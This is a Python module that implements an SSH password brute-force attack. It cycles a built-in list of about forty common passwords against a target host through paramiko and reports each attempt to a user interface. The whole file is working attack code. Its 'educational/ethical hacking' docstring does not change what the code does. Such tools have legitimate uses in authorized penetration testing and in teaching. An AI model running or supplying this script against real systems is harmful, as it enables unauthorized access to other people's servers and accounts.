"""
SSH Brute Force Attack Module
Performs SSH login brute force attacks against target IP.
Reports each attempt via callback for real-time UI updates.
For educational/ethical hacking purposes only.
"""
import paramiko
import eventlet
import socket

class BruteForcerModule:
    DEFAULT_PASSWORDS = [
        'password', '123456', 'admin', 'letmein',
        'welcome', 'monkey','ubuntu','victim', '1234567890', 'qwerty', 'abc123',
        'password1', 'iloveyou', 'sunshine', 'princess', 'admin123',
        'root', 'toor', 'pass', 'test', 'guest',
        'master', 'dragon', 'login', 'hello', 'charlie',
        'donald', 'password2', 'password123', '123456789', '12345678', '12345',
        'shadow', 'michael', 'access', 'superman', 'batman',
        'trustno1', 'football', 'baseball', 'whatever', 'secret',
    ]

    def __init__(self):
        self.running = False
        self.attempts = 0
        self.found = False

    def get_default_passwords(self):
        """Common password list for demonstration."""
        return list(self.DEFAULT_PASSWORDS)

    def start(self, target, username, passwords, callback=None):
        """
        Start SSH brute force attack.
        target: IP address or hostname (default port 22 assumed unless specified like ip:port)
        callback(result_dict) is called per attempt for real-time updates.
        """
        self.running = True
        self.found = False
        self.attempts = 0

        # Parse target for port
        if ':' in target:
            host, port = target.split(':')
            port = int(port)
        else:
            host = target
            port = 22

        total_passwords = len(passwords)
        print(f"[*] [BruteForce] Starting attack on {host}:{port} with {total_passwords} passwords.")
        
        consecutive_errors = 0
        MAX_ERRORS = 5

        for idx, password in enumerate(passwords):
            if not self.running:
                print("[*] [BruteForce] Attack stopped by user.")
                break

            self.attempts += 1
            print(f"[*] [BruteForce] Attempt {self.attempts}/{total_passwords}: Connecting to {host}:{port}...")

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            result_data = {
                'attempt': self.attempts, 'total': total_passwords, 'password': password,
                'success': False, 'error': '', 'completed': False, 'retry': False
            }

            try:
                ssh.connect(host, port=port, username=username, password=password, timeout=3, banner_timeout=3)
                result_data['success'] = True
                self.found = True
                print(f"[+] [BruteForce] SUCCESS! Password found: '{password}'")
                ssh.close()
                consecutive_errors = 0
            except paramiko.AuthenticationException:
                 # Connection worked, auth failed. This is good!
                consecutive_errors = 0
                pass 
            except Exception as e:
                consecutive_errors += 1
                result_data['error'] = str(e)
                print(f"[-] [BruteForce] Error: {e}")
                
                if consecutive_errors >= MAX_ERRORS:
                    result_data['completed'] = True
                    result_data['error'] = f"Too many errors ({consecutive_errors}). Aborting."
                    self.running = False
                    print(f"[-] [BruteForce] Too many consecutive errors. Host might be down.")
                else:
                    result_data['retry'] = True # Let UI know we are retrying

            if callback: callback(result_data)
            
            if self.found or not self.running:
                break
            
            eventlet.sleep(0.1)
        
        if not self.found and self.running:
            print("[*] [BruteForce] Finished wordlist. No password found.")
            eventlet.sleep(0.05)

        self.running = False

    def stop(self):
        self.running = False

# Global instance
brute_forcer_module = BruteForcerModule()
